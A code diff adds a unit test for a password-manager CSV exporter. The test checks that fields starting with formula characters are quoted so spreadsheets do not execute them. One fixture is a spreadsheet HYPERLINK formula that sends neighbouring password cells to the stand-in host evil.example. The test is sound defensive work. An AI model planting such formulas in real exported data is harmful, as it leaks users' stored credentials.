@@ -86,6 +86,21 @@ describe('printPasswordsCsv', () => {
     expect(text).toBe('name,url,username,password,note\r\nshop.example,https://shop.example,ada,plain,\r\n127.0.0.1,http://127.0.0.1:8080,"a,b","say ""hi""\nthere",\r\n')
   })
 
+  it('puts a quote before a username or password a spreadsheet would run, and reading the file back removes it', () => {
+    const formula = '=HYPERLINK("https://evil.example/?"&D2&D3,"x")'
+    const logins = [
+      { origin: 'https://evil.example', username: formula, password: '+1' },
+      { origin: 'https://b.example', username: '@SUM(A1)', password: '-2' },
+      { origin: 'https://c.example', username: '\tcmd', password: "'=still text" },
+      { origin: 'https://d.example', username: "'quoted", password: "it's" }
+    ]
+    const text = printPasswordsCsv(logins)
+    expect(text).toContain(`"'=HYPERLINK(""https://evil.example/?""&D2&D3,""x"")"`)
+    expect(text).toContain("https://b.example,'@SUM(A1),'-2,")
+    expect(text.split('\r\n').filter((line) => /,=|,\+|,-|,@/.test(line))).toEqual([])
+    expect(parsePasswordsCsv(text)).toEqual({ ok: true, logins, skipped: 0 })
+  })
+
   it('round-trips through the parser', () => {
     const logins = [
       { origin: 'https://shop.example', username: 'ada', password: 'p,w"\r\nx' },
